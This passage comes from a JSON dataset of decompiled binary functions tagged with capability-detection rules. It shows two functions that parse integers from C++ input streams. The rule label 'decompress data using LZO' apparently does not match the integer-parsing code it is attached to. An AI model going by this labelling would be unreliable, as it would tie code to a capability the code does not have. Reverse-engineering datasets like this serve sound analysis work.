        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nulong __cdecl\nfcn.004661f0(int32_t *arg_8h, uint32_t arg_ch, int32_t *arg_10h, int32_t arg_14h, int32_t arg_18h, uint32_t *arg_1ch, \n            uint16_t *arg_20h)\n\n{\n    uint8_t uVar1;\n    bool bVar2;\n    char cVar3;\n    uint16_t uVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    bool bVar8;\n    int32_t iVar9;\n    bool bVar10;\n    bool bVar11;\n    char cVar12;\n    uint32_t uVar13;\n    uint32_t uVar14;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint32_t var_4ch;\n    uint32_t var_48h;\n    uint32_t var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint *var_31h;\n    uint32_t var_2ch;\n    uint32_t var_28h;\n    uint var_ch;\n    \n    iVar9 = arg_18h;\n    uVar14 = 8;\n    iVar5 = fcn.0044da00(arg_18h + 0x6c);\n    uVar6 = *(iVar9 + 0xc) & 0x4a;\n    if ((uVar6 != 0x40) && (uVar14 = 10,  uVar6 == 8)) {\n        uVar14 = 0x10;\n    }\n    bVar8 = arg_8h != NULL && arg_ch == 0xffffffff;\n    bVar10 = arg_ch == 0xffffffff;\n    if (((bVar8) && (bVar10 = false,  arg_8h[3] <= arg_8h[2])) && (iVar9 = (**(*arg_8h + 0x24))(),  iVar9 == -1)) {\n        arg_8h = NULL;\n        bVar10 = bVar8;\n    }\n    bVar8 = arg_10h != NULL && arg_14h == -1;\n    var_44h._0_1_ = arg_14h == -1;\n    if ((bVar8) && (var_44h._0_1_ = false,  arg_10h[3] <= arg_10h[2])) {\n        iVar9 = (**(*arg_10h + 0x24))();\n        var_44h._0_1_ = false;\n        if (iVar9 == -1) {\n            arg_10h = NULL;\n            var_44h._0_1_ = bVar8;\n        }\n    }\n    if (var_44h == bVar10) {\n        bVar8 = false;\n        uVar13 = 0;\n        var_50h._3_1_ = 1;\n        var_44h = 0;\n        bVar10 = false;\n    }\n    else {\n        uVar13 = arg_ch;\n        if ((arg_ch == 0xffffffff) && (arg_8h != NULL)) {\n            if (arg_8h[3] <= arg_8h[2]) {\n                uVar13 = (**(*arg_8h + 0x24))();\n                if (uVar13 == 0xffffffff) {\n                    arg_8h = NULL;\n                    uVar13 = 0xffffffff;\n                }\n                goto code_r0x00466280;\n            }\n            uVar1 = *arg_8h[2];\n            uVar13 = uVar1;\n            cVar3 = *(iVar5 + 0x10);\n            bVar8 = *(iVar5 + 0x4a) == uVar1;\n            if (!bVar8) goto code_r0x00466290;\ncode_r0x00466299:\n            if (((cVar3 == '\\0') || (*(iVar5 + 0x25) != uVar13)) && (*(iVar5 + 0x24) != uVar13)) {\n                if (arg_8h[2] < arg_8h[3]) {\n                    arg_8h[2] = arg_8h[2] + 1;\n                }\n                else {\n                    (**(*arg_8h + 0x28))();\n                }\n                arg_ch = 0xffffffff;\n                var_50h._3_1_ = fcn.004502d0(&arg_10h);\n                var_44h = 0;\n                bVar10 = false;\n                if (var_50h._3_1_ != 0) goto code_r0x004662f0;\n                uVar13 = fcn.00450370();\n                cVar3 = *(iVar5 + 0x10);\n            }\n        }\n        else {\ncode_r0x00466280:\n            cVar3 = *(iVar5 + 0x10);\n            bVar8 = *(iVar5 + 0x4a) == uVar13;\n            if (bVar8) goto code_r0x00466299;\ncode_r0x00466290:\n            if (*(iVar5 + 0x4b) == uVar13) goto code_r0x00466299;\n            bVar8 = false;\n        }\n        var_44h = 0;\n        bVar10 = false;\n        while (((cVar12 = uVar13,  cVar3 == '\\0' || (*(iVar5 + 0x25) != cVar12)) && (*(iVar5 + 0x24) != cVar12))) {\n            if (*(iVar5 + 0x4e) == cVar12) {\n                bVar2 = uVar14 == 10 | bVar10 ^ 1U;\n                if (!bVar2) goto code_r0x004664aa;\n                bVar10 = uVar6 == 0 || uVar14 == 8;\n                if (uVar6 != 0 && uVar14 != 8) {\n                    var_44h = var_44h + 1;\n                    goto code_r0x004664de;\n                }\n                var_44h = 0;\n                uVar14 = 8;\n                uVar7 = arg_8h[2];\n                if (arg_8h[3] <= uVar7) goto code_r0x00466580;\ncode_r0x004664ed:\n                arg_8h[2] = uVar7 + 1;\ncode_r0x004664fa:\n                var_48h._0_1_ = false;\n                if ((arg_8h[3] <= arg_8h[2]) && (iVar9 = (**(*arg_8h + 0x24))(),  iVar9 == -1)) {\n                    arg_8h = NULL;\n                    var_48h._0_1_ = true;\n                }\n            }\n            else {\n                if (!bVar10) break;\ncode_r0x004664aa:\n                if ((*(iVar5 + 0x4c) != cVar12) && (*(iVar5 + 0x4d) != cVar12)) {\n                    var_50h._3_1_ = 0;\n                    bVar10 = true;\n                    goto code_r0x004662f0;\n                }\n                var_50h._3_1_ = uVar14 == 0x10 || uVar6 == 0;\n                if (uVar14 != 0x10 && uVar6 != 0) {\n                    bVar10 = true;\n                    goto code_r0x004662fc;\n                }\n                var_44h = 0;\n                uVar14 = 0x10;\n                bVar2 = false;\ncode_r0x004664de:\n                uVar7 = arg_8h[2];\n                bVar10 = bVar2;\n                if (uVar7 < arg_8h[3]) goto code_r0x004664ed;\ncode_r0x00466580:\n                (**(*arg_8h + 0x28))();\n                if (arg_8h != NULL) goto code_r0x004664fa;\n                var_48h._0_1_ = true;\n            }\n            arg_ch = 0xffffffff;\n            bVar2 = arg_10h != NULL && arg_14h == -1;\n            var_50h._2_1_ = arg_14h == -1;\n            if ((bVar2) && (var_50h._2_1_ = false,  arg_10h[3] <= arg_10h[2])) {\n                var_50h._2_1_ = false;\n                iVar9 = (**(*arg_10h + 0x24))();\n                if (iVar9 == -1) {\n                    arg_10h = NULL;\n                    var_50h._2_1_ = bVar2;\n                }\n            }\n            if (var_48h._0_1_ == var_50h._2_1_) {\n                var_50h._3_1_ = 1;\n                goto code_r0x004662f0;\n            }\n            uVar13 = arg_ch;\n            if (arg_8h != NULL) {\n                if (arg_8h[2] < arg_8h[3]) {\n                    uVar13 = *arg_8h[2];\n                }\n                else {\n                    uVar13 = (**(*arg_8h + 0x24))();\n                    if (uVar13 == 0xffffffff) {\n                        arg_8h = NULL;\n                        uVar13 = 0xffffffff;\n                    }\n                }\n            }\n            if (!bVar10) break;\n            cVar3 = *(iVar5 + 0x10);\n        }\n        var_50h._3_1_ = 0;\n    }\ncode_r0x004662f0:\n    var_4ch = 0x16;\n    if (uVar14 != 0x10) {\ncode_r0x004662fc:\n        var_4ch = uVar14;\n    }\n    uVar1 = var_50h._3_1_;\n    unique0x00001d00 = &var_28h;\n    var_2ch = 0;\n    var_28h = var_28h & 0xffffff00;\n    if (*(iVar5 + 0x10) != '\\0') {\n        fcn.004b1bc0(0x20);\n    }\n    var_50h._2_1_ = *(iVar5 + 100);\n    var_54h._0_2_ = 0xffff / uVar14;\n    if (var_50h._2_1_ == 0) {\n        if (var_50h._3_1_ == 0) {\n            var_50h._1_1_ = 0;\n            var_48h = 0;\ncode_r0x00466352:\n            cVar3 = uVar13;\n            iVar9 = cVar3;\n            if (var_4ch < 0xb) {\n                if ((cVar3 < '0') || (var_4ch + '0' <= cVar3)) goto code_r0x004665f2;\n            }\n            else if (9 < cVar3 - 0x30U) goto code_r0x004665db;\n            iVar9 = iVar9 + -0x30;\ncode_r0x00466374:\n            if (iVar9 != -1) {\n                do {\n                    if (var_54h < var_48h) {\n                        var_50h._1_1_ = 1;\n                        uVar6 = arg_8h[2];\n                        if (arg_8h[3] <= uVar6) goto code_r0x00466686;\ncode_r0x004663b9:\n                        arg_8h[2] = uVar6 + 1;\ncode_r0x004663c6:\n                        var_50h._2_1_ = false;\n                        if (arg_8h[3] <= arg_8h[2]) {\n                            iVar9 = (**(*arg_8h + 0x24))();\n                            var_50h._2_1_ = false;\n                            if (iVar9 == -1) {\n                                arg_8h = NULL;\n                                var_50h._2_1_ = true;\n                            }\n                        }\n                    }\n                    else {\n                        var_50h._1_1_ = var_50h._1_1_ | 0xffff - iVar9 < (var_48h * uVar14 & 0xffff);\n                        var_48h = iVar9 + var_48h * uVar14;\n                        uVar6 = arg_8h[2];\n                        var_44h = var_44h + 1;\n                        if (uVar6 < arg_8h[3]) goto code_r0x004663b9;\ncode_r0x00466686:\n                        (**(*arg_8h + 0x28))();\n                        if (arg_8h != NULL) goto code_r0x004663c6;\n                        var_50h._2_1_ = true;\n                    }\n                    arg_ch = 0xffffffff;\n                    bVar11 = arg_10h != NULL && arg_14h == -1;\n                    bVar2 = arg_14h == -1;\n                    if ((bVar11) && (bVar2 = false,  arg_10h[3] <= arg_10h[2])) {\n                        iVar9 = (**(*arg_10h + 0x24))();\n                        bVar2 = false;\n                        if (iVar9 == -1) {\n                            arg_10h = NULL;\n                            bVar2 = bVar11;\n                        }\n                    }\n                    if (var_50h._2_1_ == bVar2) {\n                        var_50h._2_1_ = 1;\n                        goto code_r0x004663fd;\n                    }\n                    uVar13 = arg_ch;\n                    if (arg_8h == NULL) goto code_r0x00466352;\n                    if (arg_8h[2] < arg_8h[3]) {\n                        uVar13 = *arg_8h[2];\n                        goto code_r0x00466352;\n                    }\n                    uVar13 = (**(*arg_8h + 0x24))();\n                    if (uVar13 != 0xffffffff) goto code_r0x00466352;\n                    arg_8h = NULL;\n                    if (var_4ch < 0xb) break;\n                    cVar3 = -1;\n                    iVar9 = -1;\ncode_r0x004665db:\n                    if (5 < cVar3 + 0x9fU) goto code_r0x00466740;\n                    iVar9 = iVar9 + -0x57;\n                    if (iVar9 == -1) break;\n                } while( true );\n            }\n            goto code_r0x004665f2;\n        }\n        var_50h._2_1_ = var_50h._3_1_;\n        var_50h._1_1_ = 0;\n        var_50h._3_1_ = 0;\n        var_48h._0_2_ = 0;\n    }\n    else {\n        if (var_50h._3_1_ == 0) {\n            var_50h._1_1_ = 0;\n            var_48h = 0;\ncode_r0x004667aa:\n            uVar6 = var_2ch;\n            cVar3 = uVar13;\n            if ((*(iVar5 + 0x10) == 0) || (*(iVar5 + 0x25) != cVar3)) {\n                if ((cVar3 == *(iVar5 + 0x24)) ||\n                   (iVar9 = sub.msvcrt.dll_memchr(iVar5 + 0x4e, cVar3, var_4ch),  iVar9 == 0)) goto code_r0x004665f2;\n                iVar9 = iVar9 - (iVar5 + 0x4e);\n                if (0xf < iVar9) {\n                    iVar9 = iVar9 + -6;\n                }\n                if (var_48h <= var_54h) {\n                    var_50h._1_1_ = var_50h._1_1_ | 0xffff - iVar9 < (var_48h * uVar14 & 0xffff);\n                    var_44h = var_44h + 1;\n                    var_48h = iVar9 + var_48h * uVar14;\n                    goto code_r0x0046681a;\n                }\n                uVar6 = arg_8h[2];\n                var_50h._1_1_ = var_50h._2_1_;\n                if (arg_8h[3] <= uVar6) goto code_r0x00466874;\ncode_r0x00466825:\n                arg_8h[2] = uVar6 + 1;\ncode_r0x00466832:\n                var_5ch._0_1_ = 0;\n                if (arg_8h[3] <= arg_8h[2]) {\n                    iVar9 = (**(*arg_8h + 0x24))();\n                    var_5ch._0_1_ = 0;\n                    if (iVar9 == -1) {\n                        arg_8h = NULL;\n                        var_5ch._0_1_ = var_50h._2_1_;\n                    }\n                }\n            }\n            else {\n                if (var_44h == 0) {\n                    var_50h._2_1_ = 0;\n                    var_50h._3_1_ = *(iVar5 + 0x10);\n                    goto code_r0x004663fd;\n                }\n                uVar13 = var_2ch + 1;\n                uVar7 = 0xf;\n                if (stack0xffffffcc != &var_28h) {\n                    uVar7 = var_28h;\n                }\n                if (uVar7 < uVar13) {\n                    fcn.004b1f10(var_2ch, 0, 0, 1);\n                }\n                var_44h = 0;\n                *(stack0xffffffcc + uVar6) = var_44h;\n                *(stack0xffffffcc + uVar13) = 0;\n                var_2ch = uVar13;\ncode_r0x0046681a:\n                uVar6 = arg_8h[2];\n                if (uVar6 < arg_8h[3]) goto code_r0x00466825;\ncode_r0x00466874:\n                (**(*arg_8h + 0x28))();\n                var_5ch._0_1_ = var_50h._2_1_;\n                if (arg_8h != NULL) goto code_r0x00466832;\n            }\n            arg_ch = 0xffffffff;\n            bVar11 = arg_10h != NULL && arg_14h == -1;\n            bVar2 = arg_14h == -1;\n            if ((bVar11) && (bVar2 = false,  arg_10h[3] <= arg_10h[2])) {\n                iVar9 = (**(*arg_10h + 0x24))();\n                bVar2 = false;\n                if (iVar9 == -1) {\n                    arg_10h = NULL;\n                    bVar2 = bVar11;\n                }\n            }\n            if (bVar2 == var_5ch) goto code_r0x004663fd;\n            uVar13 = arg_ch;\n            if (arg_8h != NULL) {\n                if (arg_8h[2] < arg_8h[3]) {\n                    uVar13 = *arg_8h[2];\n                }\n                else {\n                    uVar13 = (**(*arg_8h + 0x24))();\n                    if (uVar13 == 0xffffffff) {\n                        arg_8h = NULL;\n                        uVar13 = 0xffffffff;\n                    }\n                }\n            }\n            goto code_r0x004667aa;\n        }\n        var_50h._1_1_ = 0;\n        var_50h._3_1_ = 0;\n        var_50h._2_1_ = uVar1;\n        var_48h._0_2_ = 0;\n    }\ncode_r0x004663fd:\n    if (var_2ch != 0) goto code_r0x00466601;\ncode_r0x00466405:\n    if ((var_44h != 0) || (bVar10)) {\ncode_r0x00466646:\n        if (var_50h._3_1_ == 0) {\n            if (var_50h._1_1_ == 0) {\n                uVar4 = -var_48h;\n                if (!bVar8) {\n                    uVar4 = var_48h;\n                }\n                *arg_20h = uVar4;\n            }\n            else {\n                *arg_20h = 0xffff;\n                *arg_1ch = 4;\n            }\n            goto code_r0x0046642b;\n        }\n    }\ncode_r0x0046641a:\n    *arg_20h = 0;\n    *arg_1ch = 4;\ncode_r0x0046642b:\n    if (var_50h._2_1_ != 0) {\n        *arg_1ch = *arg_1ch | 2;\n    }\n    if (stack0xffffffcc != &var_28h) {\n        fcn.004c2c30(stack0xffffffcc);\n    }\n    return CONCAT44(arg_ch, arg_8h);\ncode_r0x00466740:\n    if (5 < cVar3 + 0xbfU) goto code_r0x004665f2;\n    iVar9 = iVar9 + -0x37;\n    goto code_r0x00466374;\ncode_r0x004665f2:\n    var_50h._2_1_ = 0;\n    if (var_2ch == 0) goto code_r0x00466405;\ncode_r0x00466601:\n    fcn.004b20a0(var_44h);\n    cVar3 = fcn.004bdf20(*(iVar5 + 8), *(iVar5 + 0xc), &var_31h + 1);\n    if (cVar3 == '\\0') {\n        *arg_1ch = 4;\n    }\n    if ((bVar10) || ((var_44h | var_2ch) != 0)) goto code_r0x00466646;\n    goto code_r0x0046641a;\n}\n",
        "token_count": 5046
    },
    "00466c20": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n// WARNING: Could not reconcile some variable overlaps\n\nulong __cdecl\nfcn.00466c20(int32_t *arg_8h, uint32_t arg_ch, int32_t *arg_10h, int32_t arg_14h, int32_t arg_18h, uint32_t *arg_1ch, \n            uint32_t *arg_20h)\n\n{\n    bool bVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    bool bVar8;\n    uint32_t uVar9;\n    char cVar10;\n    bool bVar11;\n    uint32_t uVar12;\n    uint32_t uVar13;\n    uint32_t uVar14;\n    bool bVar15;\n    ulong uVar16;\n    uint var_6dh;\n    uint32_t var_68h;\n    int32_t var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint32_t var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint32_t var_48h;\n    uint8_t var_44h;\n    uint8_t var_43h;\n    uint8_t var_42h;\n    uint var_40h;\n    uint var_3ch;\n    uint *var_31h;\n    uint32_t var_2ch;\n    uint32_t var_28h;\n    uint var_bp_ch;\n    \n    iVar6 = arg_18h;\n    uVar13 = 8;\n    iVar3 = fcn.0044da00(arg_18h + 0x6c);\n    uVar4 = *(iVar6 + 0xc) & 0x4a;\n    if ((uVar4 != 0x40) && (uVar13 = 0x10,  uVar4 != 8)) {\n        uVar13 = 10;\n    }\n    bVar8 = arg_8h != NULL && arg_ch == 0xffffffff;\n    bVar15 = arg_ch == 0xffffffff;\n    if (((bVar8) && (bVar15 = false,  arg_8h[3] <= arg_8h[2])) && (iVar6 = (**(*arg_8h + 0x24))(),  iVar6 == -1)) {\n        arg_8h = NULL;\n        bVar15 = bVar8;\n    }\n    bVar8 = arg_10h != NULL && arg_14h == -1;\n    var_48h._0_1_ = arg_14h == -1;\n    if ((bVar8) && (var_48h._0_1_ = false,  arg_10h[3] <= arg_10h[2])) {\n        iVar6 = (**(*arg_10h + 0x24))();\n        var_48h._0_1_ = false;\n        if (iVar6 == -1) {\n            arg_10h = NULL;\n            var_48h._0_1_ = bVar8;\n        }\n    }\n    if (var_48h == bVar15) {\n        bVar8 = false;\n        uVar7 = 0;\n        var_42h = 1;\n        var_48h = 0;\n        bVar15 = false;\n    }\n    else {\n        uVar7 = arg_ch;\n        if ((arg_ch == 0xffffffff) && (arg_8h != NULL)) {\n            if (arg_8h[2] < arg_8h[3]) {\n                uVar7 = *arg_8h[2];\n            }\n            else {\n                uVar7 = (**(*arg_8h + 0x24))();\n                if (uVar7 == 0xffffffff) {\n                    arg_8h = NULL;\n                    uVar7 = 0xffffffff;\n                }\n            }\n        }\n        cVar2 = *(iVar3 + 0x10);\n        cVar10 = uVar7;\n        bVar8 = *(iVar3 + 0x4a) == cVar10;\n        if ((bVar8) || (*(iVar3 + 0x4b) == cVar10)) {\n            if (((cVar2 == '\\0') || (*(iVar3 + 0x25) != cVar10)) && (*(iVar3 + 0x24) != cVar10)) {\n                if (arg_8h[2] < arg_8h[3]) {\n                    arg_8h[2] = arg_8h[2] + 1;\n                }\n                else {\n                    (**(*arg_8h + 0x28))();\n                }\n                arg_ch = 0xffffffff;\n                var_42h = fcn.004502d0(&arg_10h);\n                var_48h = 0;\n                bVar15 = false;\n                if (var_42h != 0) goto code_r0x00466d21;\n                uVar7 = fcn.00450370();\n                cVar2 = *(iVar3 + 0x10);\n            }\n        }\n        else {\n            bVar8 = false;\n        }\n        var_48h = 0;\n        bVar15 = false;\n        while (((cVar10 = uVar7,  cVar2 == '\\0' || (*(iVar3 + 0x25) != cVar10)) && (*(iVar3 + 0x24) != cVar10))) {\n            if (*(iVar3 + 0x4e) == cVar10) {\n                bVar1 = uVar13 == 10 | bVar15 ^ 1U;\n                if (!bVar1) goto code_r0x00466f60;\n                bVar15 = uVar4 == 0 || uVar13 == 8;\n                if (uVar4 != 0 && uVar13 != 8) {\n                    var_48h = var_48h + 1;\n                    goto code_r0x00466f94;\n                }\n                var_48h = 0;\n                uVar13 = 8;\n                uVar12 = arg_8h[2];\n                if (arg_8h[3] <= uVar12) {\n                    uVar13 = 8;\n                    goto code_r0x00467040;\n                }\ncode_r0x00466fa3:\n                arg_8h[2] = uVar12 + 1;\ncode_r0x00466fb0:\n                var_50h._0_1_ = false;\n                if ((arg_8h[3] <= arg_8h[2]) && (iVar6 = (**(*arg_8h + 0x24))(),  iVar6 == -1)) {\n                    arg_8h = NULL;\n                    var_50h._0_1_ = true;\n                }\n            }\n            else {\n                if (!bVar15) break;\ncode_r0x00466f60:\n                if ((*(iVar3 + 0x4c) != cVar10) && (*(iVar3 + 0x4d) != cVar10)) {\n                    var_42h = 0;\n                    bVar15 = true;\n                    goto code_r0x00466d21;\n                }\n                var_42h = uVar13 == 0x10 || uVar4 == 0;\n                if (uVar13 != 0x10 && uVar4 != 0) {\n                    bVar15 = true;\n                    goto code_r0x00466d2d;\n                }\n                var_48h = 0;\n                uVar13 = 0x10;\n                bVar1 = false;\ncode_r0x00466f94:\n                uVar12 = arg_8h[2];\n                bVar15 = bVar1;\n                if (uVar12 < arg_8h[3]) goto code_r0x00466fa3;\ncode_r0x00467040:\n                (**(*arg_8h + 0x28))();\n                if (arg_8h != NULL) goto code_r0x00466fb0;\n                var_50h._0_1_ = true;\n            }\n            arg_ch = 0xffffffff;\n            bVar1 = arg_10h != NULL && arg_14h == -1;\n            var_42h = arg_14h == -1;\n            if ((bVar1) && (var_42h = false,  arg_10h[3] <= arg_10h[2])) {\n                var_42h = false;\n                iVar6 = (**(*arg_10h + 0x24))();\n                if (iVar6 == -1) {\n                    arg_10h = NULL;\n                    var_42h = bVar1;\n                }\n            }\n            if (var_42h == var_50h._0_1_) {\n                var_42h = 1;\n                goto code_r0x00466d21;\n            }\n            uVar7 = arg_ch;\n            if (arg_8h != NULL) {\n                if (arg_8h[2] < arg_8h[3]) {\n                    uVar7 = *arg_8h[2];\n                }\n                else {\n                    uVar7 = (**(*arg_8h + 0x24))();\n                    if (uVar7 == 0xffffffff) {\n                        arg_8h = NULL;\n                        uVar7 = 0xffffffff;\n                    }\n                }\n            }\n            if (!bVar15) break;\n            cVar2 = *(iVar3 + 0x10);\n        }\n        var_42h = 0;\n    }\ncode_r0x00466d21:\n    var_54h = 0x16;\n    if (uVar13 != 0x10) {\ncode_r0x00466d2d:\n        var_54h = uVar13;\n    }\n    unique0x00001d00 = &var_28h;\n    var_2ch = 0;\n    var_28h = var_28h & 0xffffff00;\n    if (*(iVar3 + 0x10) != '\\0') {\n        fcn.004b1bc0(0x20);\n    }\n    var_68h = 0;\n    var_64h = -0x80000000;\n    if (!bVar8) {\n        var_68h = 0xffffffff;\n        var_64h = 0x7fffffff;\n    }\n    uVar16 = fcn.00437f00(var_68h, var_64h, uVar13, 0);\n    uVar4 = uVar16 >> 0x20;\n    var_43h = *(iVar3 + 100);\n    if (var_43h == 0) {\n        if (var_42h == 0) {\n            var_44h = 0;\n            uVar12 = 0;\n            uVar14 = 0;\ncode_r0x00466dd0:\n            cVar2 = uVar7;\n            iVar6 = cVar2;\n            if (var_54h < 0xb) {\n                if ((cVar2 < '0') || (var_54h + '0' <= cVar2)) goto code_r0x004670b2;\n            }\n            else if (9 < cVar2 - 0x30U) goto code_r0x0046709b;\n            uVar7 = iVar6 - 0x30;\ncode_r0x00466df2:\n            if (uVar7 != 0xffffffff) {\n                do {\n                    if (uVar4 < uVar14 || uVar4 - uVar14 < (uVar16 < uVar12)) {\n                        var_44h = 1;\n                        uVar7 = arg_8h[2];\n                        if (arg_8h[3] <= uVar7) goto code_r0x00467163;\ncode_r0x00466e52:\n                        arg_8h[2] = uVar7 + 1;\ncode_r0x00466e5f:\n                        var_43h = false;\n                        if (arg_8h[3] <= arg_8h[2]) {\n                            iVar6 = (**(*arg_8h + 0x24))();\n                            var_43h = false;\n                            if (iVar6 == -1) {\n                                arg_8h = NULL;\n                                var_43h = true;\n                            }\n                        }\n                    }\n                    else {\n                        uVar5 = uVar12 * uVar13;\n                        uVar14 = (uVar12 * uVar13 >> 0x20) + uVar13 * uVar14;\n                        uVar12 = (var_64h - (uVar7 >> 0x1f)) - (var_68h < uVar7);\n                        var_44h = var_44h | (uVar12 < uVar14 || uVar12 - uVar14 < (var_68h - uVar7 < uVar5));\n                        uVar12 = uVar5 + uVar7;\n                        uVar14 = uVar14 + (uVar7 >> 0x1f) + CARRY4(uVar5, uVar7);\n                        var_48h = var_48h + 1;\n                        uVar7 = arg_8h[2];\n                        if (uVar7 < arg_8h[3]) goto code_r0x00466e52;\ncode_r0x00467163:\n                        (**(*arg_8h + 0x28))();\n                        if (arg_8h != NULL) goto code_r0x00466e5f;\n                        var_43h = true;\n                    }\n                    arg_ch = 0xffffffff;\n                    bVar11 = arg_10h != NULL && arg_14h == -1;\n                    bVar1 = arg_14h == -1;\n                    if ((bVar11) && (bVar1 = false,  arg_10h[3] <= arg_10h[2])) {\n                        iVar6 = (**(*arg_10h + 0x24))();\n                        bVar1 = false;\n                        if (iVar6 == -1) {\n                            arg_10h = NULL;\n                            bVar1 = bVar11;\n                        }\n                    }\n                    if (bVar1 == var_43h) {\n                        var_43h = 1;\n                        goto code_r0x00466e96;\n                    }\n                    uVar7 = arg_ch;\n                    if (arg_8h == NULL) goto code_r0x00466dd0;\n                    if (arg_8h[2] < arg_8h[3]) {\n                        uVar7 = *arg_8h[2];\n                        goto code_r0x00466dd0;\n                    }\n                    uVar7 = (**(*arg_8h + 0x24))();\n                    if (uVar7 != 0xffffffff) goto code_r0x00466dd0;\n                    arg_8h = NULL;\n                    if (var_54h < 0xb) break;\n                    cVar2 = -1;\n                    iVar6 = -1;\ncode_r0x0046709b:\n                    if (5 < cVar2 + 0x9fU) goto code_r0x00467220;\n                    uVar7 = iVar6 - 0x57;\n                    if (uVar7 == 0xffffffff) break;\n                } while( true );\n            }\n            goto code_r0x004670b2;\n        }\n        var_43h = var_42h;\n        var_44h = 0;\n        uVar12 = 0;\n        var_42h = 0;\n        uVar14 = 0;\n    }\n    else {\n        if (var_42h == 0) {\n            var_44h = 0;\n            uVar12 = 0;\n            uVar14 = 0;\ncode_r0x0046728b:\n            uVar5 = var_2ch;\n            cVar2 = uVar7;\n            if ((*(iVar3 + 0x10) == 0) || (*(iVar3 + 0x25) != cVar2)) {\n                if ((cVar2 == *(iVar3 + 0x24)) ||\n                   (iVar6 = sub.msvcrt.dll_memchr(iVar3 + 0x4e, cVar2, var_54h),  iVar6 == 0)) goto code_r0x004670b2;\n                uVar7 = iVar6 - (iVar3 + 0x4e);\n                if (0xf < uVar7) {\n                    uVar7 = uVar7 - 6;\n                }\n                if (uVar14 <= uVar4 && (uVar16 < uVar12) <= uVar4 - uVar14) {\n                    uVar5 = uVar12 * uVar13;\n                    uVar14 = (uVar12 * uVar13 >> 0x20) + uVar13 * uVar14;\n                    uVar12 = (var_64h - (uVar7 >> 0x1f)) - (var_68h < uVar7);\n                    var_44h = var_44h | (uVar12 < uVar14 || uVar12 - uVar14 < (var_68h - uVar7 < uVar5));\n                    uVar12 = uVar5 + uVar7;\n                    uVar14 = uVar14 + (uVar7 >> 0x1f) + CARRY4(uVar5, uVar7);\n                    var_48h = var_48h + 1;\n                    goto code_r0x00467322;\n                }\n                uVar7 = arg_8h[2];\n                var_44h = var_43h;\n                if (arg_8h[3] <= uVar7) goto code_r0x00467382;\ncode_r0x0046732d:\n                arg_8h[2] = uVar7 + 1;\ncode_r0x0046733a:\n                var_6dh._1_1_ = 0;\n                if (arg_8h[3] <= arg_8h[2]) {\n                    iVar6 = (**(*arg_8h + 0x24))();\n                    var_6dh._1_1_ = 0;\n                    if (iVar6 == -1) {\n                        arg_8h = NULL;\n                        var_6dh._1_1_ = var_43h;\n                    }\n                }\n            }\n            else {\n                if (var_48h == 0) {\n                    var_43h = 0;\n                    var_42h = *(iVar3 + 0x10);\n                    goto code_r0x00466e96;\n                }\n                uVar7 = var_2ch + 1;\n                uVar9 = 0xf;\n                if (stack0xffffffcc != &var_28h) {\n                    uVar9 = var_28h;\n                }\n                if (uVar9 < uVar7) {\n                    fcn.004b1f10(var_2ch, 0, 0, 1);\n                }\n                var_48h = 0;\n                *(stack0xffffffcc + uVar5) = var_48h;\n                *(stack0xffffffcc + uVar7) = 0;\n                var_2ch = uVar7;\ncode_r0x00467322:\n                uVar7 = arg_8h[2];\n                if (uVar7 < arg_8h[3]) goto code_r0x0046732d;\ncode_r0x00467382:\n                (**(*arg_8h + 0x28))();\n                var_6dh._1_1_ = var_43h;\n                if (arg_8h != NULL) goto code_r0x0046733a;\n            }\n            arg_ch = 0xffffffff;\n            bVar11 = arg_10h != NULL && arg_14h == -1;\n            bVar1 = arg_14h == -1;\n            if ((bVar11) && (bVar1 = false,  arg_10h[3] <= arg_10h[2])) {\n                iVar6 = (**(*arg_10h + 0x24))();\n                bVar1 = false;\n                if (iVar6 == -1) {\n                    arg_10h = NULL;\n                    bVar1 = bVar11;\n                }\n            }\n            if (bVar1 == var_6dh._1_1_) goto code_r0x00466e96;\n            uVar7 = arg_ch;\n            if (arg_8h != NULL) {\n                if (arg_8h[2] < arg_8h[3]) {\n                    uVar7 = *arg_8h[2];\n                }\n                else {\n                    uVar7 = (**(*arg_8h + 0x24))();\n                    if (uVar7 == 0xffffffff) {\n                        arg_8h = NULL;\n                        uVar7 = 0xffffffff;\n                    }\n                }\n            }\n            goto code_r0x0046728b;\n        }\n        uVar12 = 0;\n        uVar14 = 0;\n        var_44h = 0;\n        var_43h = var_42h;\n        var_42h = 0;\n    }\ncode_r0x00466e96:\n    if (var_2ch != 0) goto code_r0x004670c1;\ncode_r0x00466e9e:\n    if ((var_48h != 0) || (bVar15)) {\ncode_r0x00467109:\n        if (var_42h == 0) {\n            if (var_44h == 0) {\n                if (bVar8) {\n                    bVar15 = uVar12 != 0;\n                    uVar12 = -uVar12;\n                    uVar14 = -(uVar14 + bVar15);\n                }\n                *arg_20h = uVar12;\n                arg_20h[1] = uVar14;\n            }\n            else {\n                uVar4 = 0;\n                uVar13 = 0x80000000;\n                if (!bVar8) {\n                    uVar4 = 0xffffffff;\n                    uVar13 = 0x7fffffff;\n                }\n                *arg_20h = uVar4;\n                arg_20h[1] = uVar13;\n                *arg_1ch = 4;\n            }\n            goto code_r0x00466ecc;\n        }\n    }\ncode_r0x00466eb3:\n    *arg_20h = 0;\n    arg_20h[1] = 0;\n    *arg_1ch = 4;\ncode_r0x00466ecc:\n    if (var_43h != 0) {\n        *arg_1ch = *arg_1ch | 2;\n    }\n    if (stack0xffffffcc != &var_28h) {\n        fcn.004c2c30(stack0xffffffcc);\n    }\n    return CONCAT44(arg_ch, arg_8h);\ncode_r0x00467220:\n    if (5 < cVar2 + 0xbfU) goto code_r0x004670b2;\n    uVar7 = iVar6 - 0x37;\n    goto code_r0x00466df2;\ncode_r0x004670b2:\n    var_43h = 0;\n    if (var_2ch == 0) goto code_r0x00466e9e;\ncode_r0x004670c1:\n    fcn.004b20a0(var_48h);\n    cVar2 = fcn.004bdf20(*(iVar3 + 8), *(iVar3 + 0xc), &var_31h + 1);\n    if (cVar2 == 